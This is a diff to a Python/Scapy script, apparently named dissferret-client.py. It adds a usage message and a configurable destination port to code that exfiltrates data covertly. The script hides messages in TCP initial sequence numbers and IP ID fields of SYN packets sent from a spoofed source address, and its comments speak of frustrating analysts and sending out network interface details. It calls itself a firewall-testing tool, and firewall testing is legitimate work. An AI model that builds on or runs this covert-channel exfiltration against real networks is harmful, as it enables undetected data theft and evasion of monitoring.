@@ -97,8 +97,13 @@ interfaces = netifaces.interfaces()
 # Functions
 # =========
 
-# TODO:
-# Add functions to perform the various techniques to test a firewall against.
+# TODO: Add functions to perform the various techniques to test a firewall against.
+
+# Print usage details
+def usage():
+    # Should we set a sensible default? e.g. 127.0.0.1 80
+    print 'sudo ./dissferret-client.py [destination IP] [destination port]'
+
 
 # Does x fit in a 16bit int?
 # We need this for IPID
@@ -290,9 +295,14 @@ convert_iseq(message)
 # ttl then this will be easy to crack. We might be able to create an algorithm
 # that's complex enough to at least frustrate analysts.
 msglen = len(exfilArray)
-# Craft our basic packet.
+
 # Future work: adjust some fields to perhaps better emulate commonly seen traffic.
-pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S')
+# TODO we should add dport and flags as configurable options.
+# TODO add check, sys.argv[2] must be between 1-65565
+dstport = int(sys.argv[2])
+# Craft our basic packet.
+pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')
+
 # Attempt data exfiltration using initial sequence numbers
 exfil_iseq()
 print '[*] Sent using iseq: %s' % message
@@ -301,7 +311,7 @@ exfilArray = []  # clear before each use
 
 # ==== use IPID
 print '[*] Testing method IPID..'
-pkt = IP(src=spoof, dst=destination) / TCP(dport=37337, flags='S')  # reset our packet
+pkt = IP(src=spoof, dst=destination) / TCP(dport=dstport, flags='S')  # reset our packet
 convert_ipid(message)
 msglen = len(exfilArray)
 exfil_ipid()
@@ -309,8 +319,8 @@ print '[*] Sent using IPID: %s' % message
 
 # exfilArray = []
 # ====
-print '[*] Getting ready to send network interface details'
-# print '[*] Resetting message and exfilArray'
+#print '[*] Getting ready to send network interface details'
+#print '[*] Resetting message and exfilArray'
 #
 # message = ''
 # exfilArray = []
